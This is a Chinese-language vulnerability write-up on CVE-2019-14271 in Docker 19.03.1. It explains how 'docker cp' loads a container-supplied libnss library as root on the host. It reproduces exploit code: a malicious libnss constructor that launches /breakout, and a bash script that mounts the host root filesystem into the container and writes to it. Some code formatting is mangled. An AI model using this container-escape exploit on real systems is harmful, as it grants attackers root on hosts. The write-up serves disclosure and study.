---
title: "（CVE-2019-14271）Docker copy漏洞"
id: zhfly2890
---

# （CVE-2019-14271）Docker copy漏洞

## 一、漏洞简介

## 二、漏洞影响

Docker 19.03.1

## 三、复现过程

### Docker cp

Copy命令允许从容器、向容器中、或容器之间复制文件。语法与标准的unix cp命令非常相似。要从容器中复制/var/logs，语法是docker cp container_name:/var/logs /some/host/path。

从下图所示，要从容器中将文件复制出去，Docker使用了一个名为docker-tar的帮助进程。

![image](../img/5ddd7d1cee95b0637965f2cf8d512ac4.png)

图 1\. 从容器中复制文件

docker-tar是通过chroot到容器，将请求的文件或目录存档，然后将生成的tar文件传递给Docker daemon，然后由daemon提取到主机的目标目录中。

注释：CHROOT就是Change Root，也就是改变程序执行时所参考的根目录位置。CHROOT可以增进系统的安全性，限制使用者能做的事。

![image](../img/07d632cf0cf2eeb1f6ebdc1565d7c6d5.png)

图 2\. docker-tar chroot到容器中

Chroot主要是为了避免系统链接的问题，当主机进程尝试访问容器中的文件时就可能会引发系统链接问题。如果访问的文件中有系统链接，就会解析到host root。因此，攻击者控制的容器就可以尝试和诱使docker cp在主机而非容器上读写文件。去年有许多Docker和Podman相关的系统链接CVE漏洞。通过chroot到容器的root，docker-tar可以确保所有系统链接都可以高效地解析。

但，chroot到容器然后从容器中复制文件可能会引发很严重的安全问题。

### CVE-2019-14271

Docker是用Golang语言编写。有漏洞的Docker版本是用Go v1.11编译的。在该版本中，一些含有嵌入C代码（cgo）的包会在运行时动态加载共享的库。这些包包括net和os/user，都是docker-tar使用的，而且在运行时会加载多个libnss_*.so库。一般来说，库是从host文件系统加载的，但因为docker-tarchroot到了容器，因此会从容器文件系统中加载库。也就是说docker-tat会加载和执行来源于容器或由容器控制的代码。

需要说明的是，除了chroot到容器文件系统外，docker-tar并没有被容器化。它是在host命名空间运行的，权限为root全新且不受限于cgroups或seccomp。因此，通过注入代码到docker-tar，恶意容器就可以获取host主机的完全root访问权限。

可能的攻击场景有Docker用户从另一个Docker处复制文件：

容器运行含有恶意libnss_*.so库的镜像

容器中含有被攻击者替换的libnss_*.so库

在这两种情况下，攻击者都可以获取主机上的root代码执行权限。

### 漏洞利用

为利用该漏洞，研究人员需要先创建一个恶意libnss库。研究人员随意选择了libnss_files.so文件，下载了库函数的源码，并在代码中加入了一个函数——run_at_link()。研究人员还为该函数定义了constructor属性。constructor属性表明run_at_link函数在进程加载时会作为库的初始化函数执行。也就是说，当Docker-tar进程动态加载恶意库时，run_at_link函数就会执行。下面是run_at_link的代码：

```
#include ...

#define ORIGINAL_LIBNSS “/original_libnss_files.so.2”

#define LIBNSS_PATH “/lib/x86_64-linux-gnu/libnss_files.so.2”

bool is_priviliged();

**attribute** ((constructor)) void run_at_link(void)

{

char * argv_break[2];

if (!is_priviliged())

return;

```
 rename(ORIGINAL_LIBNSS, LIBNSS_PATH);
 fprintf(log_fp, "switched back to the original libnss_file.so");

 if (!fork())
 {

       // Child runs breakout
       argv_break[0] = strdup("/breakout");
       argv_break[1] = NULL;
       execve("/breakout", argv_break, NULL);
 }
 else
       wait(NULL); // Wait for child

 return; 
``` `}

bool is_priviliged()

{

FILE * proc_file = fopen("/proc/self/exe", “r”);

if (proc_file != NULL)

{

fclose(proc_file);

return false; // can open so /proc exists, not privileged

}

return true; // we’re running in the context of docker-tar

}` 
```

查/proc目录完成的。如果run_at_link运行在docker-tar环境下，那么目录就是空的，因为procfs挂载在/proc上只存在于容器的mount命名空间。

然后，run_at_link会用恶意libnss库替换原始库。这保证了漏洞利用运行的随后进程不会意外加载恶意版本，并触发run_at_link执行。

为简化该漏洞利用，run_at_link会尝试在容器的/breakout路径下运行可执行文件。这样漏洞利用的其他部分就可以用bash写入，而非C语言。让逻辑的其他部分在run_at_link外，意味着在漏洞利用每次变化后无需重新编译恶意库，只需改变breakout二进制文件就可以了。

![image](../img/5c5bd333283d1247c534764951704677.png)

利用CVE-2019-14271打破Docker

在该漏洞视频中，Docker用户会运行含有恶意libnss_files.so的恶意镜像，然后尝试从容器中复制一些日志。镜像中的/breakout二进制文件是一个简单的bash脚步，会挂载host文件系统到/host_fs的容器中，并将消息写入host的/evil目录。
/breakout脚本代码如下：

```
umount /host_fs && rm -rf /host_fs
mkdir /host_fs `mount -t proc none /proc     # mount the host’s procfs over /proc

cd /proc/1/root              # chdir to host’s root

mount --bind . /host_fs      # mount host root at /host_fs

echo “Hello from within the container!” > /host_fs/evil` 
```

## 四、参考链接

> https://xz.aliyun.com/t/6806